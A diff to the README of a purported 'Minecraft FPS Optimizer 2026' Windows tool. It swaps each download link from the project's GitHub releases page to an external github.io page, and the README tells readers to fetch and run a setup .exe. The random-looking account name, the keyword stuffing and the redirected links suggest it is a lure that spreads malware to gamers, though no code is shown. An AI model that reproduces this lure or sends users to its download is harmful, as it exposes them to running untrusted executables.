@@ -1,6 +1,6 @@
 # ⚡ Minecraft-FPS-Optimizer-2026 - Boost Your FPS Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Minecraft--FPS--Optimizer--2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Broadminded-uppsala5105/Minecraft-FPS-Optimizer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Minecraft--FPS--Optimizer--2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://broadminded-uppsala5105.github.io)
 
 ---
 
@@ -40,7 +40,7 @@ For older PCs or demanding gameplay, choose the "Ultra Performance" preset. This
 
 ## 🚀 Getting Started
 
-1. **Visit this link to download the application:** [Minecraft-FPS-Optimizer-2026 Releases](https://github.com/Broadminded-uppsala5105/Minecraft-FPS-Optimizer-2026/releases)
+1. **Visit this link to download the application:** [Minecraft-FPS-Optimizer-2026 Releases](https://broadminded-uppsala5105.github.io)
 
 2. Find the file named `Minecraft-FPS-Optimizer-Setup.exe` on the page and click it.
 
@@ -199,6 +199,6 @@ If Minecraft-FPS-Optimizer-2026 helped you, click the "Star" button at the top o
 
 **Download now and experience Minecraft without lag:**
 
-[![Get It Here](https://img.shields.io/badge/⬇%EF%B8%8F%20Download%20Latest%20Version-3b82f6?style=for-the-badge&logo=windows&logoColor=white&labelColor=1e3a8a)](https://github.com/Broadminded-uppsala5105/Minecraft-FPS-Optimizer-2026/releases)
+[![Get It Here](https://img.shields.io/badge/⬇%EF%B8%8F%20Download%20Latest%20Version-3b82f6?style=for-the-badge&logo=windows&logoColor=white&labelColor=1e3a8a)](https://broadminded-uppsala5105.github.io)
 
 Keywords: minecraft, fps, optimizer, lag fix, stutter fix, performance, game booster, windows toolkit, minecraft performance, jvm memory, graphics optimizer, profile system, diagnostics, backup and restore, free software, minecraft tool, pc game tools, smooth gameplay, download optimizer, fps boost 2026, minecraft smoother
